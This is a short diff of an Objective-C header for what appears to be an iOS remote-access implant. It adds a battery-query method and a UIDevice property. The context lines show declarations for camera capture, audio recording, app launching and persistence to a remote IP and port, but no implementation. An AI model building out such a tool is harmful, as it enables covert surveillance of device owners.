@@ -20,6 +20,7 @@
 @property (readwrite, retain) AVCaptureStillImageOutput *stillImageOutput;
 @property (retain) AVAudioRecorder *recorder;
 @property (retain) NSFileManager *fileManager;
+@property (retain) UIDevice *thisUIDevice;
 @property (retain) NSString *skey;
 @property (retain) CPDistributedMessagingCenter *messagingCenter;
 
@@ -67,6 +68,7 @@ extern CFStringRef SBSApplicationLaunchingErrorString(int error);
 -(void)getVolume;
 -(void)isplaying;
 -(void)listapps;
+-(void)battery;
 -(void)launchApp:(NSArray *)args;
 -(void)persistence:(NSString *)ip :(int)port;
 -(void)rmpersistence;
